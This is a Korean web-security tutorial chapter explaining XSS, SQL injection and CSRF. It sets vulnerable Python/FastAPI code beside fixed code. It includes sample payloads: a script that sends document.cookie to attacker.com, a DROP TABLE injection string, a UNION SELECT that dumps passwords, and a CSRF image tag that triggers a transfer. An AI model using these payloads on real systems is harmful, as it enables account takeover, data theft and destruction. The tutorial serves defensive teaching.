# Ch.23 사례: XSS 한 줄로 서비스가 털렸다

[< 환경 세팅](./README.md) | [웹 보안의 핵심 >](./02-web-security.md)

---

Ch.22에서 Docker로 서비스를 배포하는 것까지 다뤘다. 컨테이너를 띄우고 외부에 공개하면, 이제 아무나 요청을 보낼 수 있다. 이번에는 그 "아무나"가 악의적인 의도를 가지고 있을 때 무슨 일이 벌어지는지를 본다.


## 23-1. 사례 설명

### 사례 A: 게시판에 글을 올렸을 뿐인데

2년차 백엔드 개발자가 사내 게시판 서비스를 만들었다. 기능은 단순하다. 사용자가 글을 쓰면 제목과 내용을 DB에 저장하고, 다른 사용자가 조회하면 화면에 보여준다.

코드는 이렇다:

```python
@router.post("/posts")
def create_post(title: str, content: str):
    # 사용자 입력을 그대로 DB에 저장
    db.execute(
        "INSERT INTO posts (title, content) VALUES (:title, :content)",
        {"title": title, "content": content}
    )
    return {"result": "ok"}


@router.get("/posts/{post_id}")
def get_post(post_id: int):
    row = db.execute("SELECT * FROM posts WHERE id = :id", {"id": post_id}).fetchone()
    # 사용자 입력을 그대로 HTML에 삽입
    return HTMLResponse(f"""
        <h1>{row.title}</h1>
        <div>{row.content}</div>
    """)
```

문제가 보이는가?

`content`에 사용자가 입력한 값을 그대로 HTML에 넣고 있다. 정상적인 사용자라면 "오늘 날씨가 좋다" 같은 텍스트를 넣겠지만, 공격자는 이런 걸 넣는다:

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

이 "글"을 관리자가 열어보면? 관리자의 브라우저에서 스크립트가 실행된다. `document.cookie`에는 관리자의 세션 쿠키가 들어 있다. 그 쿠키가 공격자의 서버로 전송된다. 공격자는 이 쿠키를 자기 브라우저에 넣으면 관리자 권한으로 로그인된다.

게시판에 글 하나 올렸을 뿐인데, 관리자 계정이 탈취됐다.

<details>
<summary>XSS (Cross-Site Scripting, 크로스 사이트 스크립팅)</summary>

웹 페이지에 악성 스크립트를 주입해서, 그 페이지를 보는 다른 사용자의 브라우저에서 실행시키는 공격이다. "Cross-Site"라는 이름은 공격자의 스크립트가 피해자의 사이트 맥락에서 실행되기 때문에 붙었다. 세 가지 유형이 있다:

- Stored XSS: 악성 스크립트가 DB에 저장되어, 해당 페이지를 보는 모든 사용자에게 실행된다. 위의 게시판 사례가 이것이다.
- Reflected XSS: URL 파라미터에 스크립트를 넣어서, 해당 링크를 클릭한 사용자에게 실행된다.
- DOM-based XSS: 서버를 거치지 않고 클라이언트 자바스크립트에서 발생한다.

OWASP Top 10에 꾸준히 포함되는 대표적 웹 취약점이다.

</details>


### 사례 B: 검색 기능에 SQL을 넣으면?

같은 서비스에 검색 기능이 있다. 제목으로 게시글을 검색하는 API다:

```python
@router.get("/posts/search")
def search_posts(keyword: str):
    # f-string으로 SQL 조립 - 절대 하면 안 되는 패턴
    query = f"SELECT * FROM posts WHERE title LIKE '%{keyword}%'"
    results = db.execute(query).fetchall()
    return {"posts": results}
```

정상적인 검색어: `"파이썬"`
조립된 SQL: `SELECT * FROM posts WHERE title LIKE '%파이썬%'`

공격자의 검색어: `'; DROP TABLE posts; --`
조립된 SQL:

```sql
SELECT * FROM posts WHERE title LIKE '%'; DROP TABLE posts; --%'
```

세미콜론으로 원래 쿼리를 끝내고, `DROP TABLE posts`를 실행한다. `--`는 SQL 주석이라 뒤의 `%'`는 무시된다. 검색 한 번에 테이블이 통째로 날아간다.

(실제로는 대부분의 DB 드라이버가 세미콜론으로 구분된 다중 쿼리를 기본적으로 차단한다. pymysql도 기본 설정에서는 `DROP TABLE`이 실행되지 않는다. 하지만 `client_flag=CLIENT.MULTI_STATEMENTS`를 켜면 가능해진다. 그리고 `DROP TABLE`까지 안 가더라도, `UNION SELECT`로 다른 테이블의 데이터를 빼내는 건 기본 설정에서도 가능하다. 예를 들어 `' UNION SELECT username, password FROM users --`를 넣으면 사용자 테이블이 통째로 노출된다.)

<details>
<summary>SQL Injection (SQL 삽입 공격)</summary>

사용자 입력을 SQL 쿼리에 직접 삽입할 때, 공격자가 의도적으로 SQL 구문을 포함시켜 원래 쿼리의 의미를 바꾸는 공격이다. f-string이나 문자열 연결로 SQL을 조립하면 발생한다. 데이터 유출, 변조, 삭제, 심하면 OS 명령어 실행까지 가능하다.

방어는 간단하다. Parameterized Query(바인딩 파라미터)를 쓰면 된다. SQLAlchemy의 `:param` 문법이나 ORM을 쓰면 자동으로 방어된다.

(Java에서는 PreparedStatement가 같은 역할이다. Go에서는 `db.Query("SELECT ... WHERE id = ?", id)` 패턴이다.)

</details>


### 사례 C: 이미지를 올렸을 뿐인데 송금이 됐다

쇼핑몰 서비스에 로그인한 사용자 A가 있다. A는 정상적으로 로그인한 상태이고, 세션 쿠키가 브라우저에 저장되어 있다.

공격자가 어떤 게시판에 이런 "이미지"를 올렸다:

```html
<img src="https://shop.example.com/api/transfer?to=attacker&amount=1000000" />
```

A가 이 게시글을 열어보면? 브라우저는 이미지를 로드하려고 해당 URL로 GET 요청을 보낸다. A는 `shop.example.com`에 로그인한 상태이니까, 브라우저가 자동으로 세션 쿠키를 같이 보낸다. 서버 입장에서는 인증된 사용자의 정상 요청처럼 보인다. 송금이 실행된다.

A는 이미지를 봤을 뿐인데, 100만원이 공격자에게 이체됐다.

<details>
<summary>CSRF (Cross-Site Request Forgery, 크로스 사이트 요청 위조)</summary>

인증된 사용자가 자신의 의지와 무관하게 공격자가 원하는 행동을 하게 만드는 공격이다. 사용자가 사이트 A에 로그인한 상태에서 악의적인 사이트 B를 방문하면, 사이트 B가 사용자의 인증 정보(쿠키)를 이용해서 사이트 A에 요청을 보내는 구조다.

방어 방법: CSRF Token(서버가 발급한 일회성 토큰을 폼에 포함), SameSite 쿠키 속성, Referer/Origin 헤더 검증 등이 있다.

(송금 같은 민감한 API를 GET으로 만든 것 자체도 문제다. GET은 조회용, POST는 변경용이라는 HTTP 메서드 의미를 지키는 것도 CSRF 방어의 기본이다.)

</details>


## 23-2. 결과 예측

세 사례를 다시 보자.

- 사례 A: 사용자 입력을 그대로 HTML에 넣었다 (XSS)
- 사례 B: 사용자 입력을 그대로 SQL에 넣었다 (SQL Injection)
- 사례 C: 인증된 사용자의 요청을 검증하지 않았다 (CSRF)

공통점이 뭔가?

<!-- 기대 키워드: XSS, SQL Injection, CSRF, Input Validation, OWASP Top 10, Escape, Parameterized Query, CSRF Token -->

"사용자 입력을 신뢰했다."

A, B는 사용자가 보내는 데이터를 그대로 사용했고, C는 사용자가 보내는 요청이 "본인 의도"인지 확인하지 않았다. 세 가지 다 "사용자 입력(요청)을 신뢰하면 안 된다"는 한 문장으로 귀결된다.


## 23-3. 결과 분석

이런 취약점들을 체계적으로 정리한 게 있다. OWASP Top 10이다.

<details>
<summary>OWASP Top 10</summary>

OWASP(Open Worldwide Application Security Project)가 발표하는 웹 애플리케이션 보안 위협 상위 10개 목록이다. 2~3년 주기로 갱신된다. 2021년 기준 상위 항목은 다음과 같다:

1. Broken Access Control (접근 제어 실패)
2. Cryptographic Failures (암호화 실패)
3. Injection (주입 공격 - SQL, XSS 등)
4. Insecure Design (안전하지 않은 설계)
5. Security Misconfiguration (보안 설정 오류)
6. Vulnerable and Outdated Components (취약한 컴포넌트)
7. Identification and Authentication Failures (인증 실패)
8. Software and Data Integrity Failures (무결성 검증 실패)
9. Security Logging and Monitoring Failures (로깅/모니터링 실패)
10. Server-Side Request Forgery (SSRF)

XSS는 2021년부터 Injection 카테고리에 통합됐다. SQL Injection도 Injection이다. 면접에서 "OWASP Top 10을 아는가?"라는 질문이 나오면, 이 목록의 상위 3~5개를 설명할 수 있으면 된다.

출처: OWASP Foundation, https://owasp.org/Top10/

</details>

OWASP Top 10을 보면 알겠지만, 1위가 Broken Access Control이고 3위가 Injection이다. 앞의 세 사례는 전부 이 상위 항목에 해당한다.

왜 이런 취약점이 끊이지 않는가? 개발자가 보안을 모르기 때문이 아니다. "이 정도는 괜찮겠지"라는 판단이 문제다. f-string으로 SQL을 만들면 안 된다는 건 대부분 안다. 그런데 급하면 한다. "내부 서비스니까", "관리자만 쓰니까". 그런 코드가 운영에 올라간다. 그리고 터진다.


## 23-4. 코드 설명

취약한 코드와 방어 코드를 비교한다.

### XSS 방어: HTML Escape

취약 코드:

```python
# content에 <script>alert('XSS')</script>가 들어 있으면 그대로 실행된다
return HTMLResponse(f"<div>{content}</div>")
```

방어 코드:

```python
from markupsafe import escape

# <script> 태그가 &lt;script&gt;로 변환되어 텍스트로 표시된다
return HTMLResponse(f"<div>{escape(content)}</div>")
```

`escape()`가 하는 일: `<`를 `&lt;`로, `>`를 `&gt;`로 바꾼다. 브라우저는 `&lt;script&gt;`를 HTML 태그가 아니라 텍스트로 렌더링한다. 스크립트가 실행되지 않는다.

| 입력 | escape 전 | escape 후 |
|------|----------|----------|
| `<script>alert(1)</script>` | 스크립트 실행 | `&lt;script&gt;alert(1)&lt;/script&gt;` (텍스트 표시) |
| `<img onerror=alert(1)>` | 스크립트 실행 | `&lt;img onerror=alert(1)&gt;` (텍스트 표시) |

실무에서는 대부분 템플릿 엔진(Jinja2, React 등)이 자동으로 escape를 해준다. Jinja2의 `{{ variable }}`은 기본적으로 auto-escape가 켜져 있다. React의 JSX도 기본적으로 텍스트를 escape한다. 위험한 건 `{{ variable | safe }}`나 React의 `dangerouslySetInnerHTML`처럼 의도적으로 escape를 끄는 경우다.

### SQL Injection 방어: Parameterized Query

취약 코드:

```python
# f-string으로 SQL 조립 - 사용자 입력이 SQL 구문으로 해석된다
query = f"SELECT * FROM posts WHERE title LIKE '%{keyword}%'"
db.execute(query)
```

방어 코드:

```python
# Parameterized Query - 사용자 입력은 항상 "값"으로만 처리된다
query = "SELECT * FROM posts WHERE title LIKE :keyword"
db.execute(query, {"keyword": f"%{keyword}%"})
```

Parameterized Query에서 `:keyword`는 SQL 구문이 아니라 "값의 자리표시자"다. DB 드라이버가 SQL 파싱과 값 바인딩을 분리해서 처리한다. 사용자가 `'; DROP TABLE posts; --`를 넣어도, 이건 "검색어가 `'; DROP TABLE posts; --`인 글을 찾아라"로 해석된다. SQL 구문으로 실행되지 않는다.

SQLAlchemy ORM을 쓰면 자연스럽게 Parameterized Query가 된다:

```python
# ORM을 쓰면 자동으로 안전하다
results = session.query(Post).filter(Post.title.contains(keyword)).all()
```

### CSRF 방어: Token 검증

취약 코드:

```python
# 세션 쿠키만으로 인증 - 누가 보낸 요청인지 확인하지 않는다
@router.post("/transfer")
def transfer(to: str, amount: int, user=Depends(get_current_user)):
    # 쿠키가 유효하면 무조건 실행
    execute_transfer(user, to, amount)
```

방어 코드:

```python
# CSRF Token으로 요청의 출처를 검증한다
@router.post("/transfer")
def transfer(
    to: str,
    amount: int,
    csrf_token: str = Form(...),
    user=Depends(get_current_user),
):
    # 서버가 발급한 토큰과 요청에 포함된 토큰을 비교
    if not verify_csrf_token(user.session_id, csrf_token):
        raise HTTPException(status_code=403, detail="CSRF token invalid")
    execute_transfer(user, to, amount)
```

CSRF Token의 원리: 서버가 폼을 렌더링할 때 랜덤 토큰을 생성해서 hidden field에 넣는다. 폼을 제출하면 이 토큰이 같이 전송된다. 공격자는 이 토큰을 모르기 때문에, 외부 사이트에서 위조한 요청에는 유효한 토큰이 포함되지 않는다.

추가로, 쿠키에 `SameSite=Lax` 또는 `SameSite=Strict` 속성을 설정하면 다른 사이트에서 보낸 요청에 쿠키가 포함되지 않는다. 현대 브라우저에서는 `SameSite=Lax`가 기본값이라 CSRF 위험이 많이 줄었지만, 오래된 브라우저를 고려하면 CSRF Token도 같이 쓰는 게 안전하다.


## 정리

세 가지 공격의 핵심을 다시 한번 본다:

| 공격 | 뭘 신뢰했나 | 방어 |
|------|-----------|------|
| XSS | 사용자 입력 내용을 그대로 HTML에 삽입 | HTML Escape, CSP |
| SQL Injection | 사용자 입력을 그대로 SQL에 삽입 | Parameterized Query, ORM |
| CSRF | 인증된 사용자의 요청이 본인 의도라고 가정 | CSRF Token, SameSite Cookie |

전부 "사용자 입력을 신뢰하지 마라"는 한 가지 원칙에서 출발한다. 보안의 가장 기본적인 규칙이고, 가장 자주 무시되는 규칙이다.

그런데 보안이 XSS, SQL Injection, CSRF만 있는 건 아니다. 통신은 안전한가? 인증은 어떻게 하는가? 다른 도메인에서 오는 요청은 어떻게 제어하는가? 다음에서 본다.

---

[< 환경 세팅](./README.md) | [웹 보안의 핵심 >](./02-web-security.md)
